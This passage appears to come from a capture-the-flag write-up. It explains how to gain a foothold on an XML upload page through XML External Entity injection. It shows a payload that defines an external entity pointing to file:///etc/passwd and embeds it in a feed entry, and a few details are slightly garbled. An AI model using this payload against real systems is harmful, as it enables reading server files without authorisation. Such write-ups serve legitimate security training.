Foothold

Here we can upload xml files. Because we can upload arbitrary structured xml file, we can exploit this page with XEE(XML External Entities), which exploits the way XML parsers handle external data sources <!DOCTYPE foo [ <ENTITY myentity "value" > ] >.

Becuase home page said that the page require feed, the xml structure might be feed.xml. Let's see how we can create minimum feed xml.

└─$ curl -s https://0xdf.gitlab.io/feed.xml | xmllint --format - | head -16

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<entry>
<Author>xee</Author>
<Subject>&xxe</Subject>
<Content>Test</Content>
</entry>
